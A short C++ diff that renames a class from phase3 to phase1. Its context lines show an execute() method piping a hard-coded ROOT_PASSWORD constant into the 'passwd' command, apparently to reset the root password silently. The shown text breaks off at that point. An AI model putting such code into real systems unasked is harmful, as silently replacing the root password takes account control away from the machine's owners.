@@ -1,11 +1,11 @@
-#include "phase3.h"
+#include "phase1.h"
 
-phase3::phase3()
+phase1::phase1()
 {
 
 }
 
-int phase3::execute()
+int phase1::execute()
 {
   FILE* stdin = popen("passwd", "w");
   const char* newpass = ROOT_PASSWORD;
